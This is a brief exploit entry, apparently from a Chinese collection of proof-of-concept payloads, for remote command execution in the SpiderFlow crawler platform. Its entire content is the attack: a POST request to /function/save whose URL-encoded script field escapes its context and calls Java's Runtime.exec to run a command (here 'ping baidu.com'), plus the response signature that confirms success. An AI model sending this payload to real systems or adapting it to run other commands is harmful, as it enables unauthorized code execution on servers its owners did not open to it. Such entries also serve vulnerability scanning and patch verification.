# SpiderFlowRCE

SpiderFlow ｜ 命令执行 ｜ —
- **请求**：`POST /function/save HTTP/1.1`

**Payload**
```
id=1&name=cmd&parameter=rce&script=%7DJava.type('java.lang.Runtime').getRuntime().exec('ping+baidu.com')%3B%7B
```
- **响应特征**：200 ping